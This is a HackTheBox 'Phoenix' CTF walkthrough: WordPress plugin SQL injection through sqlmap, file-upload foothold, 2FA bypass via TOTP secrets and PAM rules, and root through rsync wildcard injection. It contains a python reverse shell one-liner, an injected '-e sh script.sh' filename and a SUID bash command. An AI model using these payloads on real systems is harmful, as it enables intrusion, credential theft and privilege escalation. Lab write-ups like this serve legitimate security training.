# HackTheBox-Phoenix

## NMAP

```bash
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     Apache httpd 
| http-methods:                     
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache          
|_http-title: Did not follow redirect to https://phoenix.htb/       
443/tcp  open  ssl/http Apache httpd         
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache
|_http-title: Did not follow redirect to https://phoenix.htb/
| ssl-cert: Subject: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
| Issuer: commonName=phoenix.htb/organizationName=Phoenix Security Ltd./stateOrProvinceName=Arizona/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-15T20:08:43
| Not valid after:  2032-02-13T20:08:43
| MD5:   320f c0ee 2f18 bd78 3abc e9d8 66a6 fc26
|_SHA-1: 6879 3f3b c7d3 a517 6785 bcc7 a726 51ce 8827 4a68
| tls-alpn: 
|_  http/1.1
8888/tcp open  http     SimpleHTTPServer 0.6 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## PORT 80/443 (HTTP/HTTPS)

Visting port 80 it's going to redirect us to port 443 on `phoenix.htb` domain so let's add this to `hosts` file

<img src="https://i.imgur.com/eP8TXN7.png"/>

<img src="https://i.imgur.com/FP5kw9u.png"/>

<img src="https://i.imgur.com/kaONIzc.jpg"/>

We can see the results of wappalyzer extension that it's using wordpress cms

<img src="https://i.imgur.com/KPoEk1M.png"/>

Checking the `/wp-admin` page we'll be presented to a login page which has a signup option also we can checkout forums as well

<img src="https://i.imgur.com/ifyH8r3.png"/>

On the forums we can see there are 5 users, which can be helpful in bruteforcing in login

<img src="https://i.imgur.com/iQNXLwy.png"/>

As we can signup, so let's try creating a user

<img src="https://i.imgur.com/pFVOhGz.png"/>

<img src="https://i.imgur.com/MHRjiL0.png"/>

After logging in we can see the dashboard of wordpress but we are not really a privileged user so can't really see anything else other than blogs

<img src="https://i.imgur.com/MAxVeSz.png"/>

Although we can see a plugin named `Pie Register`

<img src="https://i.imgur.com/REMsPRw.png"/>

For this plugin was a sqli vulnerability in two different versions

<img src="https://i.imgur.com/I9o9cvp.png"/>

There wasn't any poc for this version, but there was a poc for the other version  

<img src="https://i.imgur.com/JuPjMtH.png"/>

So for checking the version, I ran `wpscan` to find out the version all to check if there were any other plugins installed

```bash
wpscan --url https://phoenix.htb --disable-tls-checks -e ap -v
```

<img src="https://i.imgur.com/gQMtllW.png"/>

<img src="https://i.imgur.com/oraRawI.png"/>

This is using `3.7.4.3`  which isn't vulnerable but we do see other plugins out of which I found , after checking for vulnerabilties in these plugins `asgaros-forum` was having a blind sqli in version < 1.15.13 and the version installed on wordpress was `1.15.12`

<img src="https://i.imgur.com/J2inDQn.png"/>

<img src="https://i.imgur.com/e1iX7oA.png"/>

Running this payload it does indeed work and refreshes the page after 10 seconds but since it's a blind sqli it's really hard to exploit it manually so I ran `sqlmap` but it wasn't able to indentify the GET parameter vulnerable to sqli

<img src="https://i.imgur.com/HTmLPzH.png"/>

<img src="https://i.imgur.com/sdPCjmY.png"/>

So trying it again with `--level=2` and `--risk=2`

```bash
sqlmap -u "https://phoenix.htb/forum/?subscribe_topic=1" --level=2 --risk=2 --batch
```
<img src="https://i.imgur.com/nFAmvRl.png"/>

And after waiting for a while it turns out that it's time-based blind sqli so it's going to take a really long time in dumping data from tables

<img src="https://i.imgur.com/7oxP5BN.png"/>

Now dumping the database was taking way too long 

<img src="https://i.imgur.com/UP4kHo3.png"/>

So we could dump the table which only has the name of the plugins to do that I looked up on google and found the question asked on stackoverflow 

<img src="https://i.imgur.com/xANSiCS.png"/>

But it's still going to take a lot of time in dumping rows and columns, so on researching more into wp_options I came to know that we can query for active plugins `active_plugins` in  column name `option_name` by selecting `wp_value` in `wp_options` table

https://stackoverflow.com/questions/2624551/wordpress-deactivate-a-plugin-via-database

<img src="https://i.imgur.com/cwdeHGL.png"/>


We can provide the sql query through `--sql-query`

```bash
sqlmap -u "https://phoenix.htb/forum/?subscribe_topic=1" --level=2 --risk=2 --sql-query="SELECT optio
n_value FROM wp_options WHERE option_name = 'active_plugins';" --batch 
```
<img src="https://i.imgur.com/K8cjd9k.png"/>

After letting this query run, it showed four plugins 

<img src="https://i.imgur.com/ViioCE2.png"/>

* accordion-slider-gallery
* adminimize
* asgaros-forum
* download-from-files

## Foothold

I tried checking exploits for accordion and adminize but they were way too old so I looked up exploit on `download-from-files` and it was having a recent vulnerability regarding arbitary file upload

https://www.exploit-db.com/exploits/50287

<img src="https://i.imgur.com/OGDEqNW.png"/>

To exploit this, we need to make a php file with a extension `.phtml`

<img src="https://i.imgur.com/zCkx7FJ.png"/>

After running the exploit it's going to give us an error regarding verfication of the ssl certificate and would fail to make a request, so we need to add `verify=false` when making a GET and POST request to phoenix.htb

<img src="https://i.imgur.com/bCiK8Ve.png"/>

<img src="https://i.imgur.com/iS7i5EI.png"/>

<img src="https://i.imgur.com/Rs2SCTW.png"/>

And after making those changes it should upload the php file

<img src="https://i.imgur.com/p2QFIHa.png"/>

<img src="https://i.imgur.com/Zbg4KQq.png"/>

Using a python3 one liner to get a reverse shell

```python
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.124",2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

<img src="https://i.imgur.com/T1Kmi5W.png"/>

After getting a shell, stabilizing it through `stty raw -echo` and `fg`

<img src="https://i.imgur.com/5SN3hIO.png"/>

Being in wordpress directory, we can read the database password from `wp-config.php`

<img src="https://i.imgur.com/duIh9ER.png"/>

<img src="https://i.imgur.com/5F8nSEF.png"/>

But when trying to change user it's going to ask us a verification code 

<img src="https://i.imgur.com/jI1zXmu.png"/>

So there's a 2FA but I wasn't able to find any secret with which I could generate the TOTP or OTP so I decide to look around and found a plugin in wordpress plugins 

<img src="https://i.imgur.com/Om18e7n.png"/>

Googling about this plugin, it seems that it's used a SSO (Single Sign On) used with multiple application

<img src="https://i.imgur.com/bdUgSod.png"/>

Using the db creds found with mysql, we can login to the database and view the tables

<img src="https://i.imgur.com/TArTejt.png"/>

Reading the data from `wp_usermeta` we can find the TOTP key

<img src="https://i.imgur.com/hWaQbzR.png"/>

In order to use this secret to generate TOTP we need to use `oathtool` 

<img src="https://i.imgur.com/Q0Q9WjA.png"/>

With this we generated TOTP which we can use for the verification, I tried for both users but it failed

<img src="https://i.imgur.com/bRo00Na.png"/>

<img src="https://i.imgur.com/K6BO7qL.png"/>

## Privilege Escalation (editor)

Searching about where the configuration for google authenticator is and seems that there's a PAM module configured with ssh

https://wiki.archlinux.org/title/Google_Authenticator

From the `/etc/pam.d/sshd` file we can see is required in ssh

<img src="https://i.imgur.com/CWxgLQL.png"/>

Also looking at `/etc/security/access-local.conf` the IP `10.11.12.13` is allowed not be asked for 2FA according to the documentation for google authenticator from the arch wiki

<img src="https://i.imgur.com/AHu01ip.png"/>

After figuiring this out still the password doesn't work on these two users, so I checked the database again for password hashes and try cracking them

<img src="https://i.imgur.com/VQgNFQa.png"/>

<img src="https://i.imgur.com/F9MGTie.png"/>

This cracked the 3 hashes so trying these for the users on the box through ssh as on switching users it will ask for verification code and we already saw that it won't ask for verification if the connection is comming from 10.11.12.13

<img src="https://i.imgur.com/PhTb1Ju.png"/>

The password `superphoenix` worked for `editor` user

<img src="https://i.imgur.com/OSUbLiT.png"/>

But doing `sudo -l` it's going to again ask for verification code

<img src="https://i.imgur.com/FA1Pggn.png/">

Checking on which directories we have access to writing somewhere

<img src="https://i.imgur.com/dv4kB2H.png"/>

Here we can see a backup of something which is being ran with a difference of 3 minutes

<img src="https://i.imgur.com/QFKQpP4.png"/>

Unzipping the archive to see what the backup is of

<img src="https://i.imgur.com/TopTFD7.png"/>

This gives a file named `dbbackup.sql`

<img src="https://i.imgur.com/p0lSES7.png"/>

And it is only taking backup of table's structrue of wordpress database

<img src="https://i.imgur.com/lCg5OCR.png"/>

Here I fell into another rabbit hole for mysqldump CVE which was found in 2016 so I again wasted my time going down that rabbit hole, after spending hours tried running `pspy` but it wasn't showing processes as any other user

<img src="https://i.imgur.com/Txr828b.png"/>

Running it with `-f` showed us a binary named `cron.sh.x` that was being called

<img src="https://i.imgur.com/ll7P7X9.png"/>

We couldn't check what and how the commands were being ran, so running it with the current user and checking pspy it should the commands that the binary was running in the background as a root user

<img src="https://i.imgur.com/tjmoyy5.png"/>


```bash
NOW=$(date +"%Y-%m-%d-%H-%M")
FILE="phoenix.htb.$NOW.tar"
cd /backups          
mysqldump -u root wordpress > dbbackup.sql
tar -cf $FILE dbbackup.sql && rm dbbackup.sql
gzip -9 $FILE
find . -type f -mmin +30 -delete     
rsync --ignore-existing -t *.* jit@10.11.12.14:/backups/ 
```

This explains about the mysqldump that was being created in /backups folder, to break down this script

1. This script is first urnning the `data` command and saving it in `NOW` variable 
2. `FILE` variable is having the archive name with the time timestamp
3. It's switching to /backups directoy
4. Running `mysqldump` to create a dump of wordpress database and saving it in `dbbackup.sql` file 
5. Creating a tar archive of dbbackup.sql file and removing it 
6. Creating gzip archive out of tar archive
7. Running `find` command to check if the file was modified in the last 30 minutes if it was then it deletes the file
8. And in the end it's using `rsync` which is used for transferring files remotely and here it's vulnerable to command injection because it has `*.*` meaning that i's transferring every file from the /backups directory 

Referring to an awesome blog post on command injection there was technique for rsync

https://betterprogramming.pub/becoming-root-with-wildcard-injections-on-linux-2dc94032abeb

<img src="https://i.imgur.com/wCNWTUM.png"/>

We can create a bash scipt having the contents

```bash
chmod +s /bin/bash
```

And creating a file which will be the argument for rsync for the remote commands to be executed via a script

```bash
touch -- "-e sh script.sh"
```

<img src="https://i.imgur.com/muAQdtv.png"/>

Checking the permissions on the bash binary

<img src="https://i.imgur.com/sXO37fF.png"/>

## Rerefences

- https://wpscan.com/vulnerability/36cc5151-1d5e-4874-bcec-3b6326235db1
- https://stackoverflow.com/questions/6219618/where-is-plugin-data-stored-in-the-database
- https://stackoverflow.com/questions/2624551/wordpress-deactivate-a-plugin-via-database
- https://wordpress.stackexchange.com/questions/286759/how-do-i-check-what-plugins-are-enabled-via-the-database
- https://www.exploit-db.com/exploits/50287
- https://stackoverflow.com/questions/51768496/why-do-https-requests-produce-ssl-certificate-verify-failed-error
- https://wiki.archlinux.org/title/Google_Authenticator
- https://betterprogramming.pub/becoming-root-with-wildcard-injections-on-linux-2dc94032abeb
